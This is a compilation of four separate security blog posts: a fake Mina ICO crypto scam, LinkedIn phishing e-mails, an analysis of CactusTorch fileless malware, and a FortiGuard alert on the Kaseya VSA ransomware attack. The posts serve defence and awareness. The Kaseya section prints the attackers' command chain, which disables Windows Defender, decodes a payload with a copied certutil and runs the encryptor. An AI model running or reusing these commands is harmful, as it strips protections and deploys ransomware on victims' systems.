+Those who get nothing risk falling victim to FOMO (fear of missing out, a term investors use for anxiety due to lost profit or opportunity) — that is, getting nervous and letting their guard down.
+An ICO that never happened FOMO is at the heart of many scams.
+Lately, for example, we’ve been seeing mass messaging to members of cryptocurrency communities in Discord, with emoji-rich text advertising a new round of an uncapped ICO allegedly being held by a (real) leading-edge blockchain startup — Mina in our example, but there are others as well.
+Just like every other fraud scheme, this one tries to rush potential victims into following a link to the “official” website.
+Incidentally, the real Mina did hold a placement not long ago, in the randomized queue format, and many who registered got no coins.
+The new scheme exploits that history.
+Scammers warning about scammers in one of the messages in Discord The message contains links to what looks like the real Mina page.
+The Mina project is dedicated to creating a minimalistic blockchain, so the Mina website is also minimalistic to the extreme — which spared the scammers the effort of building a comprehensive fake.
+Visitors are required to complete a simple registration: name, e-mail address, and, for some reason, a link to their social network page.
+The rogue site’s overall style is similar to Mina’s The scammers claim to have streamlined the ICO process: “Make a cryptocurrency payment to the specified wallet and get your tokens.”
+In fact, the next prompt, right after registration, requests a cryptocurrency selection and payment amount.
+The token “purchasing” process is designed to be as simple as possible — select one of three popular cryptocurrencies … … and then specify the sum you mean to part with (forever)
+Once the currency and sum are specified, the payment alone remains — the website offers to copy the address of the scammers’ cryptocurrency wallet or scan its QR code.
+Almost there: time to pay Once they have pocketed the money, the criminals apologize for the delay, citing necessary confirmations in the blockchain network, which, unfortunately, is under heavy load at the moment.
+They ask investors to be patient and wait for three hours before contacting support, should the coins fail to arrive.
+Everything is fine, and the coins are on their way (not really)
+It should come as no surprise that the investors will never get their coins — their money are gone for good.
+Apparently, some people have already fallen victim to the scheme.
+For example, as of the time of this publication, the wallet specified on the fake Mina page had received 0.2 BTC in payments (more than $7,000 — again, as of the time of this publication).
+How to avoid ICO cryptoscams To stay clear of the scheme described, follow these simple rules — they’re good for just about any situation.
+Think.
+Consider the incoming message soberly.
+In the fake Mina example, ask yourself why such a generous (weird but generous) offer would have no buzz in specialized communities?
+Could the sender be trying to exploit your FOMO?
+Why the need to use no link but the one in the letter?
+Why does the letter ask you to spread the information among your contacts?
+There’s no proof of scam here, but plenty of food for thought.
+Check.
+Visit the issuer’s official website by typing its address into your browser’s address bar.
+Read any coverage of the ICO project on specialized resources.
+Check the real cryptoproject servers in Discord, which stay on top of scams and post warnings.
+However you choose to research and verify, never drop your guard: Scammers have built entire fake news sites to lend credibility to cyberscams.
+Protect.
+The human factor is not infallible; we need automatic defenses for added security.
+A reliable protection solution, such as Kaspersky Internet Security , will warn you if someone tries to redirect you to a malicious, phishing, or scam website.
+
+
+Have you disabled annoying e-mail notifications from social networks?
+We think that’s great!
+We even periodically offer advice on how to cut down on digital noise .
+But LinkedIn is a special case.
+People really do expect messages from the social network for professionals — one could be from a prospective employer or business partner, after all.
+But a message from LinkedIn might just as easily come from a scammer pretending to represent a legitimate company.
+In this post, we’re taking apart some phishing e-mails masquerading as LinkedIn notifications.
+“I am a bussinessman and am interested in doing business with you” On the face of it, this type of e-mail looks like a typical partnership proposal.
+It includes the photo, position, and company name of the potential “partner,” and even a LinkedIn logo.
+The message is too short, though, and one might expect the word “businessman” to be spelled correctly in a legitimate message.
+You may also see that the message came from “LinkediinContact” — note the extra “i” — and the sender’s address has nothing to do with LinkedIn.
+E-mail purportedly from LinkedIn proposing cooperation with an Arab businessman The link in the e-mail leads to a website that looks similar to the real LinkedIn login page.
+Phishing LinkedIn login page
+But the URL is far removed from LinkedIn’s, and the domain is the Turkish .tr
+, not .com.
+If the victim enters their credentials on this site, the account will soon be in the hands of the scammers.
+“Please send me a qoute” A similar case is this message seemingly from an importer in Beijing, asking for a quote for the delivery of goods.
+The notification looks convincing; the message footer includes links to view help and unsubscribe from notifications, a copyright notice, and even the actual postal address of LinkedIn’s China office.
+Even the sender’s address looks like the real deal.
+Nevertheless, we see some red flags.
+E-mail purportedly from LinkedIn in which a Chinese buyer requests a quote.
+The sender’s address looks clean, but that doesn’t mean everything’s in order
+For example, an article is missing in front of the word “message” in the subject line.
+The author may not speak fluent English, but the platform generates the subject of LinkedIn notifications automatically, so the subject can’t contain errors.
+If you smell a rat and do a search for the company (UVLEID), you won’t find it because it doesn’t exist.
+And most important, the links in the e-mail point to a suspicious address in which random words, numbers and letters have been added to the name of the social network.
+The domain is again wrong, as well.
+This time it’s .app, which app developers use.
+The button points to a phishing site The “LinkedIn login page,” which the link opens, has issues: a blue square covering part of the last letter in the logo, and Linkedin instead of LinkedIn (under the username and password fields).
+arefully check the URL of the site and the name of the social network “You appeared in 2 search this week”
+Links in fake notifications don’t always open fake login pages — sometimes they can lead to more unexpected places.
+For example, this message saying that the recipient’s profile has been viewed twice — common information for LinkedIn users to see — obviously uses bad English, but even if you miss that, a few other details should catch your attention: Unknown sender address and link to a site in a Brazilian domain With this kind of deception, if the victim misses the strange set of letters in the sender’s address or the Brazilian domain, they may well click the button and get to an unexpected site — in our case, a “how to become a millionaire” online survey.
+After a few redirects, we ended up at a form asking for contact information, including phone numbers.
+The scammers most likely use the collected numbers for phone fraud .
+Online survey with redirect for further data harvesting How to tell if a message from a potential partner or employer is fake Cybercriminals use phishing to steal accounts, personal data, and money, but that is no reason to stop using LinkedIn or other services.
+Instead, learn how to guard against phishing , and always keep these basic tips at the ready: Watch out for unexpected messages from well-known companies; Look for inconsistencies in the names and addresses of senders, as well as typos in links, the subject line, and the e-mail body; Check notifications using official apps or websites, and in the latter case, manually type in the address or open it from your bookmarks; Enter contact information, card numbers, or login credentials only after double-checking you are on the real site; Use a reliable security solution that warns you of danger and blocks phishing and fraudulent sites.
+
+
+By McAfee on Jul 26, 2018 McAfee Labs has noticed a significant shift by some actors toward using trusted Windows executables, rather than external malware, to attack systems.
+One of the most popular techniques is a “fileless” attack.
+Because these attacks are launched through reputable executables, they are hard to detect.
+Both consumers and corporate users can fall victim to this threat.
+In corporate environments, attackers use this vector to move laterally through the network.
+One fileless threat, CactusTorch, uses the DotNetToJScript technique, which loads and executes malicious .NET
+assemblies straight from memory.
+These assemblies are the smallest unit of deployment of an application, such as a .dll
+or .exe.
+As with other fileless attack techniques, DotNetToJScript does not write any part of the malicious .NET assembly on a computer’s hard drive; hence traditional file scanners fail to detect these attacks.
+In 2018 we have seen rapid growth in the use of CactusTorch, which can execute custom shellcode on Windows systems.
+The following chart shows the rise of CactusTorch variants in the wild.
+Source: McAfee Labs.
+The DotNetToJScript tool kit Compiling the DotNetToJScript tool gives us the .NET executable DotNetToJScript.exe, which accepts the path of a .NET assembly and outputs a JavaScript file.
+Figure 1: Using DotNetToJScript.exe to create a malicious JavaScript file.
+The DotNetToJScript tool kit is never shipped with malware.
+The only component created is the output JavaScript file, which is executed on the target system by the script host (wscript.exe).
+For our analysis, we ran some basic deobfuscation and found CactusTorch , which had been hidden by some online tools: Figure 2:
+CactusTorch code.
+Before we dive into this code, we need to understand .NET
+and its COM exposure.
+When we install the .NET framework on any system, several .NET libraries are exposed via Microsoft’s Component Object Model (COM).
+Figure 3: COM exposing the .NET library System.
+Security.
+Cryptography.
+FromBase64Transform.
+If we look at the exposed interfaces, we can see IDispatch, which allows the COM object to be accessed from the script host or a browser.
+Figure 4: Exposed interfaces in a .NET library.
+To execute malicious code using the DotNetToJScript vector, an attack uses the following COM objects: Text.
+ASCIIEncoding Security.
+Cryptography.
+FromBase64Transform IO.MemoryStream
+Runtime.
+Serialization.
+Formatters.
+Binary.
+BinaryFormatter Collections.
+ArrayList
+Now, let’s return to the JavaScript code we saw in Figure 2.
+The function base64ToStream()converts the Base64-encoded serialized object to a stream.
+Before we can fully understand the logic behind the JavaScript code, we need to examine the functionality of the Base64-encoded serialized object.
+Thus our next step is to reverse engineer the embedded serialized object and recreate the class definition.
+Once that was done, the class definition looks like the following code, which is responsible for executing the malicious shellcode.
+(Special thanks to Casey Smith, @subTee, for important pointers regarding this step).
+Figure 5:
+The class definition of the embedded serialized object.
+Now we have the open-source component of CactusTorch , and the JavaScript code in Figure 2 makes sense.
+We can see how the malicious shellcode is executed on the targeted system.
+In Figure 2, line 29 the code invokes the flame(x,x) function with two arguments: the executable to launch and the shellcode.
+The .NET assembly embedded in the CactusTorch script runs the following steps to execute the malicious shellcode:
+Launches a new suspended process using CreateProcessA (to host the shellcode) Allocates some memory with VirtualAllocEx() with an EXECUTE_READWRITE privilege Writes the shellcode in the target’s process memory with WriteProcessMemory() Creates a new thread to execute the shellcode using CreateRemoteThread() Conclusion Fileless malware takes advantage of the trust factor between security software and genuine, signed Windows applications.
+Because this type of attack is launched through reputable, trusted executables, these attacks are hard to detect.
+McAfee Endpoint Security (ENS) and Host Intrusion Prevention System (HIPS) customers are protected from this class of fileless attack through Signature ID 6118.
+Acknowledgements The author thanks the following colleagues for their help with this analysis: Abhishek Karnik Deepak Setty Oliver Devane Shruti Suman References https://ruxcon.org.au/assets/2017/slides/NET-Interop-Full.pdf https://github.com/tyranid/DotNetToJScript https://github.com/mdsecactivebreach/cactustorch MITRE ATT&CK techniques Drive-by compromise Scripting using Windows Script Host Decode information Command-line interface Process injection Hashes 4CF9863C8D60F7A977E9DBE4DB270819 5EEFBB10D0169D586640DA8C42DD54BE 69A2B582ED453A90CC06345886F03833 74172E8B1F9B7F9DB600C57E07368B8F 86C47B9E0F43150FEFF5968CF4882EBB 89F87F60137E9081F40E7D9AD5FA8DEF 8A33BF71E8740BDDE23425BBC6259D8F 8DCCC9539A499D375A069131F3E06610
+924B7FB00E930082CE5B96835FDE69A1 B60E085150D53FCE271CD481435C6E1E BC7923B43D4C83D077153202D84EA603 C1A7315FB68043277EE57BDBD2950503 D2095F2C1D8C25AF2C2C7AF7F4DD4908 D5A07C27A8BBCCD0234C81D7B1843FD4 E0573E624953A403A2335EEC7FFB1D83 E1677A25A047097E679676A459C63A42 F0BC5DFD755B7765537B6A934CA6DBDC F6526E6B943A6C17A2CC96DD122B211E CDB73CC7D00A2ABB42A76F7DFABA94E1 D4EB24F9EB1244A5BEAA19CF69434127
+
+FortiGuard Labs Breaking Update A new global supply chain ransomware attack is currently targeting users of the Kaseya VSA platform—software that provides remote management of IT operations spanning service desk ticketing to performance monitoring and reporting.
+As a central management console, the Kaseya VSA platform is used by numerous managed service providers to remotely monitor and deploy software, updates, etc. to multiple machines simultaneously in a multi-user environment.
+Unofficial reports have identified the REvil ransomware threat actors as being behind this supply chain attack.
+REvil has been attributed to the DarkSide actors who most recently attacked Colonial Pipeline and JBS foods back in May.
+Those same unofficial reports claim that a malicious update was deployed to the Kaseya VSA interface by the threat actors as an update or hot fix for the Kaseya VSA agent.
+This fake update is a ransomware file, and it has now been downloaded to thousands of systems, including the machines of MSP providers and their customers who use Kaseya VSA.
+ There are reports of ransom demands of $50,000 for smaller organizations and up to $5 million for larger enterprises.
+Kaseya is urging all customers to take all on-premises VSA servers offline immediately.
+Only on-premises systems have been impacted by this attack.
+Cloud-based SaaS services remain unaffected.
+The Kaseya advisory reads in part: \"ALL ON-PREMISES VSA SERVERS SHOULD CONTINUE TO REMAIN OFFLINE UNTIL FURTHER INSTRUCTIONS FROM KASEYA ABOUT WHEN IT IS SAFE TO RESTORE OPERATIONS.
+A PATCH WILL BE REQUIRED TO BE INSTALLED PRIOR TO RESTARTING THE VSA.\" Reports of the attack first surfaced when Huntress Labs, a managed detection and response (MDR) provider, first discovered the attack and posted their findings on Reddit.
+Timing the attack for the Independence Day holiday in the United States, this supply chain ransomware attack has impacted hundreds of organizations worldwide, both large and small, across all industries and managed service providers.
+Update as of July 7 th : This sophisticated supply-chain ransomware attack initially leveraged a vulnerability in the Kaseya VSA software to gain access to victim organizations, and then used REvil’s RaaS to infect those organizations with ransomware.
+For that reason, FortiGuard Labs is providing a separate Outbreak Alert analysis for both the initial exploitation of the Kaseya vulnerability and for the subsequent REvil ransomware attack.
+Each Outbreak Alert includes information about the attack itself, Fortinet product versions that provide protection, which products could break the attack sequence, threat hunting techniques, and other information.
+Go here for the Kaseya Outbreak Alert and here for the REvil Outbreak Alert .
+What to look for Threat indications that you should be aware of include: Initial notifications indicate that the \"KElevated######\" (SQL User) account performed this action.
+VSA admin user accounts are disabled only moments before ransomware is deployed Ransomware encryptor is dropped to c:\\kworking\\agent.exe
+The VSA procedure is named \"Kaseya VSA Agent Hot-fix” At least two tasks run the following:
+C:\\WINDOWS\\system32\\cmd.exe /c ping 127.0.0.1 -n 4979 > nul C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection
+AuditMode -Force
+-MAPSReporting Disabled -SubmitSamplesConsent NeverSend copy /Y
+C:\\Windows\\System32\\certutil.exe C:\\Windows\\cert.exe echo %RANDOM%
+>>
+C:\\Windows\\cert.exe C:\\Windows\\cert.exe -decode
+c:\\kworking\\agent.crt c:\\kworking\\agent.exe del /q /f c:\\kworking\\agent.crt C:\\Windows\\cert.exe & c:\\kworking\\agent.exe
+In addition, the encryptor (agent.exe) is signed with a valid digital signature that includes the following information: Name: PB03 TRANSPORT LTD.
+Email: Brouillettebusiness@outlook.com CN =
+Sectigo RSA Code Signing, CAO =
+Sectigo Limited, L = Salford, S =
+Greater Manchester, C = GB Serial #: 119acead668bad57a48b4f42f294f8f0 Issuer: https://sectigo.com/ When agent.exe runs, the following files are dropped into the hardcoded path C:\\Windows: MsMpEng.exe - the legit Windows Defender executable mpsvc.dll - the encryptor payload that is sideloaded by the legit Defender .EXE
+Recommendations Fortinet strongly recommends organizations using the Kaseya VSA platform to implement the current guidance in Kaseya's official recommendation : \"IMMEDIATELY shutdown your VSA server until you receive further notice from [Kaseya].”
+Fortinet Protections While the Kaseya VSA supply chain attack is how the threat actors got into the different networks, the ransomware used in those attacks is blocked by FortiGuard Labs through its AV coverage against known publicly available samples as: W32/Sodinokibi.
+EAD4!tr.ransom W32/Sodinokibi.8859!tr.ransom W32/Sodinokibi.5421!tr.ransom FortiGuard Labs has IPS coverage in place as: Kaseya.
+VSA.Remote.
+Code.
+Execution All known network IOC's are blocked by the WebFiltering client.
+The FortiGuard AntiVirus service is supported by FortiGate , FortiMail, FortiClient , and FortiEDR .
+The Fortinet AntiVirus engine is a part of each of those solutions as well.
+As a result, customers who have these products with up-to-date protections are protected.
+For FortiEDR protections, all published IOCs have been added to our Cloud intelligence service and will be blocked if executed on customer systems.
+The FortiGuard Responder team has published a Knowledge Base analysis on Kaseya and “ How FortiEDR detects Kaseya supply chain ransomware attack .”
+For FortiSandbox, all publicly known ransomware samples are detected by our behavior-based protection.
+Appendix The following advisory was posted by Kaseya:
+Information Regarding Potential Attack on Kaseya VSA
+The following FortiGuard Threat Signal report contains the latest information about this ransomware attack as well as updated information about FortiGuard Labs protections: Global Ransomware and Supply Chain Attack on Kaseya VSA Affecting Multiple Organizations Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio .
+Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program .
+
+
